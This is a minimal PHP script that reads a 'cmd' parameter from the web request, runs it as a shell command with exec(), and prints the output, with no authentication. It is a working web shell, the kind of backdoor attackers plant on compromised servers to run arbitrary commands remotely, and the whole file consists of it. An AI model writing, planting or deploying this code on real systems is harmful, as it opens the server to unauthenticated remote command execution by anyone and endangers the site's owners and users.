<?php
$Mcmd = $_REQUEST['cmd'];
$output = "<pre>";
$lastline = exec($Mcmd, $arrOutput);
foreach($arrOutput as $val) 
	$output .= $val . "\n";
				
$output .= "</pre>";
echo $output;
?>